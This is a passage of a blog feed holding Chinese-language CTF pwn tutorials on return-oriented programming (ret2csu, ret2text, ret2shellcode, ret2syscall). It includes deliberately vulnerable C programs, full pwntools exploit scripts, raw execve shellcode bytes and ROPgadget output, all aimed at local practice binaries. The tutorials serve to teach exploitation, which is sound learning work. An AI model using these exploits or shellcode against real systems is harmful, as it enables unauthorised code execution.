class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Intermediate%20ROP/ret2csu/level5">level5</a></p><p><strong>将其作为64位程序进行编译，并且开启堆栈不可执行（NX）保护</strong>。<br>（注：另外注意，获取shell用的shellcode一般是调用execve(‘/bin/sh’,0,0)函数，因为system函数会受本地环境变量影响导致不可用。）</p><p>该程序在<code>read()</code>时明显存在溢出，但是因为程序非常简单，所以无法找到其他直接控制传参寄存器的<code>gadgets</code>。所以我们覆盖返回地址为<code>__libc_csu_init</code>中的<code>gadgets</code>，然后布置相关参数。<br>这里的攻击思路是，先调用<code>write()</code>泄露<code>got</code>表中已经绑定的函数地址，然后查找到对应libc的版本计算出<code>execve()</code>的地址，然后通过<code>read()</code>将<code>/bin/sh</code>和<code>execve()的地址</code>写到<code>bss</code>段，最后再调用<code>execve()</code>获取shell。</p><p>利用脚本如下：</p><blockquote><p>ps：因为我的本地libc库版本不在LibcSearcher使用的数据库中，<br>所以这里我是先泄露出需要的地址，然后手动查询libc库，从中获<br>取相关数据，所以脚本中会出现计算偏移的步骤中直接用的已知值<br>计算，这些已知值是查询到相关的libc库中对应的基址后写入的）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入需要用到的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_ret = <span class="number">0x4011e2</span></span><br><span class="line">mov_call = <span class="number">0x4011c8</span></span><br><span class="line">execve_offset = <span class="number">0xcb140</span></span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 csu 中的 gadgets的利用payload 写成函数方便每次使用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(a1,a2,a3,symbol_call)</span>:</span></span><br><span class="line"> payload = <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line"> payload += p64(pop_ret)</span><br><span class="line"> payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(a1) + p64(a2) + p64(a3) + p64(symbol_call)</span><br><span class="line"> payload += p64(mov_call)</span><br><span class="line"> payload += <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line"> payload += p64(main)</span><br><span class="line"> p.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 write 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got)</span><br><span class="line">write_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 read 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,read_got,<span class="number">8</span>,write_got)</span><br><span class="line">tmp = p.recv()</span><br><span class="line">print(tmp.encode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"泄露 libc_start_main 地址"</span>)</span><br><span class="line">csu(<span class="number">1</span>,libc_start_main_got,<span class="number">8</span>,write_got)</span><br><span class="line">libc_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">print(hex(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc偏移量</span></span><br><span class="line">libcbase = libc_addr - <span class="number">0x026d20</span></span><br><span class="line">system_addr = <span class="number">0x048870</span> + libcbase</span><br><span class="line">bin_sh = <span class="number">0x1881ac</span> + libcbase</span><br><span class="line">execve_addr = execve_offset + libcbase</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>,bss_addr,<span class="number">16</span>,read_got)</span><br><span class="line">p.send( <span class="string">'/bin/sh\x00'</span> + p64(execve_addr))</span><br><span class="line"></span><br><span class="line">csu(bss_addr,<span class="number">0</span>,<span class="number">0</span>,bss_addr+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="上篇-汐白学Pwn-3-1-ROP-Basic"><a href="#上篇-汐白学Pwn-3-1-ROP-Basic" class="headerlink" title="上篇-汐白学Pwn-3.1(ROP-Basic)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/">上篇-汐白学Pwn-3.1(ROP-Basic)</a></h2><h2 id="下篇-未完待续"><a href="#下篇-未完待续" class="headerlink" title="下篇-未完待续"></a>下篇-未完待续</h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>汐白学Pwn-3.1(ROP-Basic)</title>
    <link href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/"/>
    <id>http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/</id>
    <published>2020-04-07T13:30:21.609Z</published>
    <updated>2020-04-29T17:17:51.690Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ROP介绍"><a href="#ROP介绍" class="headerlink" title="ROP介绍"></a>ROP介绍</h2><p>因为各种保护的出现，直接向栈或者堆上直接注入代码的方式难以发挥效果。所以需要相应的方法来绕过保护，而目前主要的是<code>ROP(Return Oriented Programming)</code>，其主要方法是在栈缓冲区溢出的基础上，利用程序中已有的小片段<code>(gadgets)</code>来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓<code>gadgets</code>就是以<code>ret</code>结尾的指令序列，通过这些指令序列，可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为<code>ROP</code>，是因为核心在于利用了指令集中的<code>ret</code>指令，改变了指令流的执行顺序。<code>ROP</code>攻击一般得满足如下条件:</p><ul><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的<code>gadgets</code>以及相应<code>gadgets</code>的地址。</p></li></ul><p>如果<code>gadgets</code>每次的地址是不固定的，就需要想办法动态获取对应的地址。</p><p>这里我是看 <strong>ctf-wiki</strong> 进行入门学习的，所以写的内容是根据 <strong>ctf-wiki</strong> 中pwn的文章进行的梳理。<br>推荐直接去：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/" target="_blank" rel="noopener">ctf-wiki</a></p><h2 id="basic-ROP"><a href="#basic-ROP" class="headerlink" title="basic ROP"></a>basic ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>最基础的ROP利用。<strong>ret</strong> 即指汇编的<code>ret</code>命令，<strong>text</strong> 指程序的代码段。<br>也就是通过溢出构造ROP链去 <strong>执行程序本身已经存在的代码</strong> 来实现自身想要实现的效果。</p><p>简单写一个入门样例程序，编译时保护全关。代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf;</span><br><span class="line">  gets(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2text/ret2text">ret2text</a><br>这个程序使用了gets危险函数，存在溢出点。使用ida查看伪c代码可以直接看到<code>buf</code>到栈底的距离只有 4byte 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;buf, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要输入超过 4byte 的数据就可以覆盖到栈底的值和返回地址，而且这个程序已经预先写好了<code>system(&quot;/bin/sh&quot;)</code>在<code>hacker</code>函数里。<br>只要将返回地址覆盖为<code>hacker</code>的地址执行即可。这里再覆盖数据的时候注意：<strong>32bit和64bit的程序的栈指针宽度不同前者为32位4byte，后者8byte，所以数据覆盖到栈底是要注意</strong>到这个问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">4</span>+<span class="number">8</span>)      <span class="comment"># 4 是覆盖 到 栈底需要的长度，8 是 覆盖 栈底 需要的长度，64bit系统栈指针宽为 8 byte ，该程序是64位</span></span><br><span class="line">payload += p64(<span class="number">0x401132</span>) <span class="comment"># pwntools 的 p32/64 前文有写过，处理数据挺方便的</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>一般来说可执行程序执行时都是让<code>cpu</code>直接读取运行<code>机器码</code>的，而机器码说到底不过是一串对<code>cpu</code><strong>具有特殊意义</strong>的二进制数值，而计算机系统内部的所有工作都是基于二进制的，包括我们的输入也是以二进制的形式储存在一个地方。如果一个程序存在溢出，但是它本身没有什么可以让我们直接利用的代码段，这时候我们可以看看有没有机会让<code>cpu</code>去<strong>执行我们所能控制的二进制数值</strong>，也就是将我们的输入作为机器码直接执行。<br>说直白一点就是我们刻意控制我们输入的其实是一串可以实现特殊作用的机器码，然后想办法控制<code>cpu</code>的<code>rip/eip</code>为我们的输入的地址，从而令其执行我们想要执行的命令。这串用以<strong>实现某个目的</strong>的<code>code</code>就是所谓的<code>shellcode</code>。</p><p>下面举个例子，源码如下：（<em>假设我们已经可以控制eip为我们的输入所在地址，直接验证shellcode能否实现我们的目的</em>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[<span class="number">24</span>] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%24c"</span>,shellcode);</span><br><span class="line">    (<span class="keyword">void</span>)((<span class="keyword">void</span> (*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2shellcode/shellcode">shellcode</a><br>程序已经声明了一个字符串变量，然后我们输入的内容会被作为指令执行。这里我们将事先准备的可以呼出终端的<code>shellcode</code>作为输入观察结果，这里依旧通过<code>pwntools</code>来完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./shellcode"</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到，我们成功用这个本来什么功能都没有的程序呼出了一个终端。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200423183617.png" alt="20200423183617"></p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>前面我们知道了可以通过<code>溢出</code>和<code>ret</code>来控制程序的执行内容以及<code>shellcode</code>的大概工作原理。那么当我们不能直接控制程序执行<code>shellcode</code>时，我们可以试着<strong>通过</strong><code>ret</code><strong>程序本身的个别代码段，变相实现</strong><code>shellcode</code>的作用。</p><p>这里主要要说到<strong>两个汇编语句</strong>：32bit程序是<code>int 80h</code> 、64bit程序是<code>syscall</code>。这两个语句分别是<code>32bit</code>和<code>64bit</code>实现系统调用的关键语句。<br>不了解系统调用的先来简单了解一下：</p><ul><li><a href="https://blog.csdn.net/u011308691/article/details/16119207?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2" target="_blank" rel="noopener">csdn-简单了解系统调用</a></li><li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" target="_blank" rel="noopener">维基百科的详细介绍</a></li></ul><p>利用<code>ret2text</code>来调用程序本身的汇编语句实现<code>shellcode</code>。这个就是<code>ret2syscall</code>。<br>在做ctf时一般是通过<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>来呼出终端实现目的。</p><p>这里因为直接编译c程序不好控制它的汇编代码所以直接用ctf-wiki里给的程序了，偷个懒233<br> <strong>bamboofox</strong> 中的 <strong>ret2syscall</strong> ：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2syscall/rop">ret2syscall</a></p><p>用<code>pwntools</code>自带的<code>checksec</code>命令可以看到我们关注的信息：</p><blockquote><p>Arch:     i386-32-little<br>  RELRO:    Partial RELRO<br>  Stack:    No canary found<br>  NX:       NX enabled<br>  PIE:      No PIE (0x8048000)</p></blockquote><p>ida查看main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧是一个简单的栈溢出，没有预留什么功能函数。需要<code>ret2syscall</code>的方法来<code>getshell</code>。这里32bit系统的<code>execve()</code>函数的调用号一般都是 <strong>11</strong> 也就是 <strong>0xb</strong> 。<br>所以我们要构造一串命令，将 <strong>eax赋值为0xb，清零ecx，edx，将“/bin/sh”的地址放入ebx，最后执行int 80h</strong>。<br>这里我一般是用<code>ROPgadget</code>来寻找程序里可以实现相关目的的代码段。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>程序里可以用的代码片段不止一个是一般选最方便的，这里选第二个。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这里选<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p><p>顺便看看程序里有没有能用的<code>/bin/sh</code>字符串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --string '/bin/sh'</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>最后找一个<code>int 80h</code>就可以了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'int'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br></pre></td></tr></table></figure><p>至此，相关片段都已经找好了，我们只需要构造一下payload，是其能完美调用这些片段并实现我们的目的就好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">eax_addr = p32(<span class="number">0x80bb196</span>)</span><br><span class="line">binsh_addr = p32(<span class="number">0x80be408</span>)</span><br><span class="line">edx_ecx_ebx_addr = p32(<span class="number">0x806eb90</span>)</span><br><span class="line">int_addr = p32(<span class="number">0x8049421</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x70</span></span><br><span class="line">payload += eax_addr</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += edx_ecx_ebx_addr</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += binsh_addr</span><br><span class="line">payload += int_addr</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="上篇-汐白学Pwn-2-SomeBasic"><a href="#上篇-汐白学Pwn-2-SomeBasic" class="headerlink" title="上篇-汐白学Pwn-2(SomeBasic)"></a><a href="http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/">上篇-汐白学Pwn-2(SomeBasic)</a></h2><h2 id="下篇-汐白学Pwn-3-2-ROP-Intermediate"><a href="#下篇-汐白学Pwn-3-2-ROP-Intermediate" class="headerlink" title="下篇-汐白学Pwn-3.2(ROP-Intermediate)"></a><a href="http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/">下篇-汐白学Pwn-3.2(ROP-Intermediate)</a></h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>汐白学Pwn-2(SomeBasic)</title>
    <link href="http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/"/>
    <id>http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/</id>
    <published>2020-03-24T14:04:21.527Z</published>
    <updated>2020-04-29T17:17:51.663Z</updated>
    
